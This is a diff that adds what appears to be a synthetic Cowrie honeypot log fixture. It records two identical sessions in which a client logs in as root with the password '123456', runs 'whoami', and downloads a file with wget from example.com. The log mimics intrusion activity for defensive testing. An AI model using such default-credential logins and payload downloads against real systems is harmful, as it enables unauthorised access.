@@ -1,0 +1,9 @@
+{"eventid":"cowrie.login.success","session":"session-1","src_ip":"10.0.0.1","timestamp":"2026-09-27T10:00:00Z","username":"root","password":"123456"}
+{"eventid":"cowrie.command.input","session":"session-1","src_ip":"10.0.0.1","timestamp":"2026-09-27T10:00:01Z","input":"whoami"}
+{"eventid":"cowrie.command.input","session":"session-1","src_ip":"10.0.0.1","timestamp":"2026-09-27T10:00:02Z","input":"wget http://example.com/file"}
+{"eventid":"cowrie.session.closed","session":"session-1","src_ip":"10.0.0.1","timestamp":"2026-09-27T10:00:03Z"}
+
+{"eventid":"cowrie.login.success","session":"session-2","src_ip":"10.0.0.2","timestamp":"2026-09-27T10:02:00Z","username":"root","password":"123456"}
+{"eventid":"cowrie.command.input","session":"session-2","src_ip":"10.0.0.2","timestamp":"2026-09-27T10:02:01Z","input":"whoami"}
+{"eventid":"cowrie.command.input","session":"session-2","src_ip":"10.0.0.2","timestamp":"2026-09-27T10:02:02Z","input":"wget http://example.com/file"}
+{"eventid":"cowrie.session.closed","session":"session-2","src_ip":"10.0.0.2","timestamp":"2026-09-27T10:02:03Z"}
